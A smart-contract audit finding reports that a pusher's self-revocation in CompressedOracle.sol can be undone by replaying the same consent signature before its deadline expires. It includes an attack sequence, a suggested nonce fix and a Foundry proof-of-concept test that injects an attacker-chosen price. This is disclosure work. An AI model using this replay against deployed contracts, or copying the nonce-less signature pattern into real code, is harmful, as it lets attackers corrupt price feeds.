### Title
`revokePusher()` self-revocation is silently bypassed by creator replaying the original consent signature within the deadline window — (`CompressedOracle.sol`)

---

### Summary

`CompressedOracleV1.allowPushers` explicitly documents that the `deadline` parameter exists to prevent a creator from re-establishing a delegation **after the pusher has revoked it**. However, the implementation only blocks replay once the deadline timestamp has passed. During the entire deadline window the creator can replay the identical signature to immediately undo any `revokePusher()` call, making the pusher's self-revocation mechanism ineffective.

---

### Finding Description

`allowPushers` verifies a pusher's EIP-191 consent signature and writes `namespaceRemapping[pusher] = msg.sender`: [1](#0-0) 

The only replay guard is `_ensureDeadline(deadline)`, which checks `block.timestamp <= deadline`: [2](#0-1) 

`revokePusher()` clears the mapping to `address(0)`: [3](#0-2) 

There is **no nonce, no used-signature set, and no per-pusher revocation flag**. The signed message binds only `(chainid, oracle, deadline, pusher, creator)`. Once the pusher has signed and handed the signature to the creator, the creator holds a replayable token valid until `deadline`.

The code comment on line 189–191 explicitly acknowledges the threat:

> *"The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."*

But the deadline only closes the window **after** it expires — it does nothing to prevent replay **during** the window. [1](#0-0) 

**Attack sequence (analogous to the Flatcoin lock-bypass):**

1. Pusher P signs consent for creator C with `deadline = T + 1 day`.
2. Creator C calls `allowPushers(deadline, [P], [sig])` → `namespaceRemapping[P] = C`.
3. Pusher P calls `revokePusher()` → `namespaceRemapping[P] = address(0)`.
4. Creator C immediately calls `allowPushers(deadline, [P], [sig])` with the **same signature** → `namespaceRemapping[P] = C` again. Succeeds because `block.timestamp <= deadline` and the signature is still valid.
5. Pusher P's subsequent pushes via the `fallback()` path continue to land in creator C's namespace. [4](#0-3) 

---

### Impact Explanation

The `fallback()` push path resolves the target namespace from `namespaceRemapping[msg.sender]`, falling back to the pusher's own address only when the mapping is zero: [5](#0-4) 

Because the creator can keep the mapping non-zero, the pusher's pushes continue to overwrite the creator's price slots. If the pusher's key is compromised and an attacker is injecting bad prices into the creator's namespace, the legitimate pusher cannot stop the feed by calling `revokePusher()` — the creator (or an attacker who has also compromised the creator) can replay the original consent to immediately restore the delegation. Bad bid/ask prices produced from the corrupted slot then propagate through any `PriceProvider` that reads the creator's `feedId`, reaching pool swaps.

The `getOracleData` read path decodes price and spread directly from the stored slot without any additional freshness check beyond `timestampMs`: [6](#0-5) 

---

### Likelihood Explanation

The creator must have retained the original consent signature (routine in any off-chain key-management flow). The replay requires a single on-chain transaction with no additional cost. The window lasts as long as the deadline — tests use `block.timestamp + 1 days`, meaning the pusher has no effective self-revocation for up to 24 hours. Any pusher who signs a long-lived consent (common for automated bots) is fully exposed for the entire deadline duration.

---

### Recommendation

Track consumed signatures with a per-pusher revocation nonce or a `mapping(bytes32 => bool) usedConsents` set. On `revokePusher()`, increment the pusher's nonce (or mark the signature hash as used). Include the nonce in the signed message so that any previously issued signature becomes invalid immediately upon revocation:

```solidity
// In allowPushers:
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(
        block.chainid, address(this), deadline,
        pusher, msg.sender,
        pusherNonce[pusher]   // <-- add nonce
    ))
);

// In revokePusher:
pusherNonce[msg.sender]++;    // invalidates all prior signatures
namespaceRemapping[msg.sender] = address(0);
```

### Proof of Concept

```solidity
function testRevokePusherBypassViaDeadlineReplay() public {
    uint256 deadline = block.timestamp + 1 days;

    // Step 1: pusher signs consent for creator
    bytes memory sig = _signConsent(PUSHER_KEY, deadline, pusher, creator);

    address[] memory pushers = new address[](1);
    pushers[0] = pusher;
    bytes[] memory sigs = new bytes[](1);
    sigs[0] = sig;

    // Step 2: creator establishes delegation
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);
    assertEq(oracle.namespaceRemapping(pusher), creator);

    // Step 3: pusher self-revokes
    vm.prank(pusher);
    oracle.revokePusher();
    assertEq(oracle.namespaceRemapping(pusher), address(0), "revoked");

    // Step 4: creator replays the SAME signature — deadline still valid
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);  // succeeds — no revert
    assertEq(
        oracle.namespaceRemapping(pusher),
        creator,
        "revocation bypassed: pusher is re-delegated against their will"
    );

    // Step 5: pusher's next push still lands in creator's namespace
    uint56 tsMs = uint56(block.timestamp * 1000);
    uint48 raw  = _packRaw(999_999, 5, 0);   // attacker-controlled price
    vm.prank(pusher);
    (bool ok,) = address(oracle).call(_wordAt(0, 0, raw, tsMs));
    assertTrue(ok);
    assertEq(
        oracle.getOracleData(oracle.feedIdOf(creator, 0, 0)).price,
        U64x32.decode(uint32(raw >> 16)),
        "bad price landed in creator namespace after revocation"
    );
}
```

```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```
